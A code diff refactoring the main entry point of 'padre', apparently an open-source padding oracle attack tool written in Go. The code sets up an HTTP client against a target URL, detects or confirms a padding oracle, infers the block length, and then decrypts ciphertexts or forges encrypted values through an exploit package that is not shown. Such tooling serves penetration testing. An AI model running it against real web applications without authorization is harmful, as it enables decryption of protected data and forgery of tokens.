@@ -3,137 +3,217 @@ package main
 import (
 	"bufio"
 	"fmt"
+	"net/http"
 	"os"
 
+	fcolor "github.com/fatih/color"
+	"github.com/glebarez/padre/pkg/client"
 	"github.com/glebarez/padre/pkg/color"
-	"github.com/glebarez/padre/pkg/util"
-	"honnef.co/go/tools/config"
+	"github.com/glebarez/padre/pkg/encoder"
+	"github.com/glebarez/padre/pkg/exploit"
+	"github.com/glebarez/padre/pkg/printer"
+	"github.com/glebarez/padre/pkg/probe"
+	"github.com/glebarez/padre/pkg/status"
+)
+
+var (
+	stderr = fcolor.Error
+	stdout = os.Stdout
 )
 
 func main() {
-	// parse CLI arguments, exit if not ok
-	ok, args := parseArgs()
-	if !ok {
+	var err error
+
+	// initialize printer
+	print := printer.Printer{Stream: stderr}
+
+	// parse CLI arguments
+	args, errs := parseArgs()
+
+	// check if errors occured during CLI arguments parsing
+	if len(errs.errors) > 0 {
+		for _, e := range errs.errors {
+			print.Error(e)
+		}
+
+		print.Println("Run with %s option to see usage help", color.CyanBold("-h"))
 		os.Exit(1)
 	}
 
-	// show welcomming message
-	out.PrintInfo("padre is on duty")
-	out.PrintInfo(fmt.Sprintf("Using concurrency (http connections): %d", *args.Parallel))
-
-	// content-type detection
-	if *args.POSTdata != "" && *args.ContentType == "" {
-		// if not passed, determine automatically
-		*args.ContentType = util.DetectContentType(*args.POSTdata)
-		out.PrintSuccess("HTTP Content-Type detected automatically as " + out.Yellow(*args.ContentType))
+	// check if warnings occured during CLI arguments parsing
+	for _, w := range errs.warnings {
+		print.Warning(w)
 	}
 
-	ok = true
-	return
+	// show welcoming message
+	print.Info("padre is on duty")
 
-	var err error
+	// be excplicit about concurrency
+	print.Info("using concurrency (http connections): %d", *args.Parallel)
 
-	/* parse command line arguments, this will fill the config structure exit right away if not ok */
-	ok, input := parseArgs()
-	if !ok {
-		return
+	// initialize HTTP client
+	client := &client.Client{
+		HTTPclient: &http.Client{
+			Transport: &http.Transport{
+				MaxConnsPerHost: *args.Parallel,
+				Proxy:           http.ProxyURL(args.ProxyURL),
+			}},
+		URL:                    *args.TargetURL,
+		POSTdata:               *args.POSTdata,
+		Cookies:                args.Cookies,
+		CihperPlaceholder:      `$`,
+		Encoder:                args.Encoder,
+		Concurrency:            *args.Parallel,
+		ContentType:            *args.ContentType,
+		NewRequestEventHandler: nil,
 	}
 
-	/* initialize HTTP client */
-	err = initHTTP()
-	if err != nil {
-		die(err)
-	}
+	// create matcher for padding error
+	var matcher probe.PaddingErrorMatcher
 
-	// detect/confirm padding oracle
-	if *config.blockLen != 0 {
-		if err = detectOrConfirmPaddingOracle(*config.blockLen); err != nil {
-			err := newErrWithHints(err, makeDetectionHints()...)
-			die(err)
+	if *args.PaddingErrorPattern != "" {
+		matcher, err = probe.NewMatcherByRegexp(*args.PaddingErrorPattern)
+		if err != nil {
+			print.Error(err)
+			os.Exit(1)
 		}
+	}
+
+	// -- detect/confirm padding oracle
+	// set block lengths to try
+	var blockLengths []int
+
+	if *args.BlockLen == 0 {
+		// no block length expliitly provided, we need to try all supported lengths
+		blockLengths = []int{8, 16, 32}
 	} else {
-		// if block length is not set explicitly, detect it by testing possible values
-		for _, blockLen := range []int{8, 16, 32} {
-			if err = detectOrConfirmPaddingOracle(blockLen); err == nil {
-				printSuccess(fmt.Sprintf("Detected block length: %d", blockLen))
-				*config.blockLen = blockLen
+		blockLengths = []int{*args.BlockLen}
+	}
+
+	var i, bl int
+	// if matcher was already created due to explicit pattern provided in args
+	// we need to just confirm the existence of padding oracle
+	if matcher != nil {
+		print.Action("confirming padding oracle...")
+		for i, bl = range blockLengths {
+			confirmed, err := probe.ConfirmPaddingOracle(client, matcher, bl)
+			if err != nil {
+				print.Error(err)
+				os.Exit(1)
+			}
+
+			// exit as soon as padding oracle is confirmed
+			if confirmed {
+				print.Success("padding oracle confirmed")
 				break
 			}
-		}
-		if err != nil {
-			err := newErrWithHints(err, makeDetectionHints()...)
-			die(err)
+
+			// on last iteration, getting here means confirming failed
+			if i == len(blockLengths)-1 {
+				print.Errorf("padding oracle was not confirmed")
+				os.Exit(1)
+			}
 		}
 	}
 
-	/* choose processing  processing function depending on the mode*/
-	var do func(string) ([]byte, error)
-	var mode string
+	// if matcher was not created (e.g. pattern was not provided in CLI args)
+	// then we need to auto-detect the fingerprint of padding oracle
+	if matcher == nil {
+		print.Action("fingerprinting HTTP responses for padding oracle...")
+		for i, bl = range blockLengths {
+			matcher, err = probe.DetectPaddingErrorFingerprint(client, bl)
+			if err != nil {
+				print.Error(err)
+				os.Exit(1)
+			}
 
-	if *config.encrypt {
-		do = encrypt
-		mode = "encrypt"
+			// exit as soon as fingerprint is detected
+			if matcher != nil {
+				print.Success("successfully detected padding oracle")
+				break
+			}
+
+			// on last iteration, getting here means confirming failed
+			if i == len(blockLengths)-1 {
+				print.Errorf("could not auto-detect padding oracle fingerprint")
+				os.Exit(1)
+			}
+		}
+	}
+
+	// set block length if it was auto-detected
+	if *args.BlockLen == 0 {
+		*args.BlockLen = bl
+		print.Success("detected block length: %d", bl)
+	}
+
+	// print mode used
+	if *args.EncryptMode {
+		print.Warning("mode: %s", color.CyanBold("encrypt"))
 	} else {
-		do = decrypt
-		mode = "decrypt"
+		print.Warning("mode: %s", color.CyanBold("decrypt"))
 	}
-	printWarning("Mode: " + cyanBold(mode))
 
-	/* process inputs one by one */
-	var errCount int
-
-	/* build list of inputs */
+	// build list of inputs to process
 	inputs := make([]string, 0)
 
-	if input == nil {
+	if args.Input == nil {
 		// read inputs from stdin
 		scanner := bufio.NewScanner(os.Stdin)
 		for scanner.Scan() {
 			inputs = append(inputs, scanner.Text())
 		}
 	} else {
-		// use single input, passed in command line
-		inputs = append(inputs, *input)
+		// use single input, passed in CLI arguments
+		inputs = append(inputs, *args.Input)
 	}
 
-	totalInputs = len(inputs)
+	// init padre instance
+	padre := &exploit.Padre{
+		Client:   client,
+		Matcher:  matcher,
+		BlockLen: *args.BlockLen,
+	}
 
-	for _, c := range inputs {
+	// process inputs one by one
+	var errCount int
+
+	for i, input := range inputs {
 		// create new status bar for current input
-		createNewStatus()
+		print.Stream = status.NewPrefixedWriter(
+			fmt.Sprintf("[%d/%d]", i+1, len(inputs)), stderr,
+		)
 
-		// do the work
-		output, err := do(c)
+		// encrypt or decrypt
+		var output []byte
+		if *args.EncryptMode {
+			output, err = padre.Encrypt(input, nil)
+		} else {
+			output, err = decrypt(input, padre, args.Encoder)
+		}
 
 		// in case of error, skip to the next input
 		if err != nil {
-			printError(err)
+			print.Error(err)
 			errCount++
-		}
-
-		// close status for current input
-		closeCurrentStatus()
-
-		// continue to the next input
-		if err != nil {
 			continue
 		}
 
-		/* write output only if output is redirected to file
-		because outputs already will be in status output
-		and printing them again to STDOUT again, will be ugly */
-		if !isTerminal(os.Stdout) {
-			var err error
+		// write output only if output is redirected to file or piped
+		// this is because outputs already will be in status output
+		// so printing them to STDOUT again is not necessary
+		if !isTerminal(stdout) {
 			/* in case of encryption, additionally encode the produced output */
-			if *config.encrypt {
-				outputStr := config.encoder.EncodeToString(output)
-				_, err = os.Stdout.WriteString(outputStr + "\n")
+			if *args.EncryptMode {
+				outputStr := args.Encoder.EncodeToString(output)
+				_, err = stdout.WriteString(outputStr + "\n")
+				if err != nil {
+					// do not tolerate errors in output writer
+					print.Error(err)
+					os.Exit(1)
+				}
 			} else {
-				os.Stdout.Write(append(output, '\n'))
-			}
-
-			if err != nil {
-				die(err)
+				stdout.Write(append(output, '\n'))
 			}
 		}
 	}
@@ -144,57 +224,21 @@ func main() {
 	}
 }
 
-// detects padding error fingerprint if matching pattern is not provided
-// otherwise, confirms padding oracle using provided pattern
-func detectOrConfirmPaddingOracle(blockLen int) error {
-	if *config.paddingErrorPattern == "" {
-		printAction("Fingerprinting HTTP responses for padding oracle...")
-		fp, err := detectPaddingErrorFingerprint(blockLen)
-		if err != nil {
-			return err
-		}
-		if fp != nil {
-			printSuccess("Successfully detected padding oracle")
-			config.paddingErrorFingerprint = fp
-		} else {
-			return fmt.Errorf("failed to auto-detect padding oracle response")
-		}
-	} else {
-		printAction("Confirming padding oracle...")
-		confirmed, err := confirmPaddingOracle(blockLen)
-		if err != nil {
-			return err
-		}
-		if confirmed {
-			printSuccess("Confirmed padding oracle")
-		} else {
-			return fmt.Errorf("padding oracle not confirmed")
-		}
-	}
-	return nil
-}
-
-func makeDetectionHints(*config.Config) []string {
-	// hint intro
-	intro := `if you believe target is vulnerable, try following:`
-	li := color.CyanBold(`> `)
-	hints := []string{intro}
-
-	// block length
-	if *config.blockLen != 0 {
-		hints = append(hints, li+hint.omitBlockLen)
-	} else {
-		// error pattern
-		if *config.paddingErrorPattern != "" {
-			hints = append(hints, li+hint.omitErrPattern)
-		} else {
-			hints = append(hints, li+hint.setErrPattern)
-		}
+func decrypt(input string, padre *exploit.Padre, encoder encoder.Encoder) ([]byte, error) {
+	if input == "" {
+		return nil, fmt.Errorf("empty input cipher")
 	}
 
-	// concurrency
-	if *config.parallel > 10 {
-		hints = append(hints, li+hint.lowerConnections)
+	// decode input into bytes
+	ciphertext, err := encoder.DecodeString(input)
+	if err != nil {
+		return nil, err
 	}
-	return hints
+
+	output, err := padre.Decrypt(ciphertext, nil)
+	if err != nil {
+		return nil, err
+	}
+
+	return output, nil
 }
